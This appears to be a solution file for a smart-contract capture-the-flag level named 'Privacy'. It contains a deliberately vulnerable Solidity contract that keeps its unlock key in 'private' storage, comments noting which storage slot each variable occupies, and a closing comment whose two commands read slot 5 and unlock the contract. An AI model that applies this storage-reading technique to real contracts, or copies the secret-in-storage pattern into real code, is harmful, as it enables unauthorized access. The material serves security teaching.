// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true; // 0 slot
  uint256 public ID = block.timestamp; // 1 slot
  uint8 private flattening = 10; // 2 slot
  uint8 private denomination = 255; // 2 slot
  uint16 private awkwardness = uint16(block.timestamp); // 2 slot
  bytes32[3] private data; // 3,4,5 slot. data[2] is at 5th slot

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

contract Test {
    // input: 0x8dbd6e3827b47658cfc430a42d9d6cfe37595ee8c9cfacbf2f47bea89954a74d
    // output: 0x8dbd6e3827b47658cfc430a42d9d6cfe
    function test(bytes32 _value) public pure returns(bytes16) {
        return bytes16(_value);
    }
}

/*
1. let key = await web3.eth.getStorageAt(instance, 5);
2. await contract.unlock(key.slice(0, 34))
*/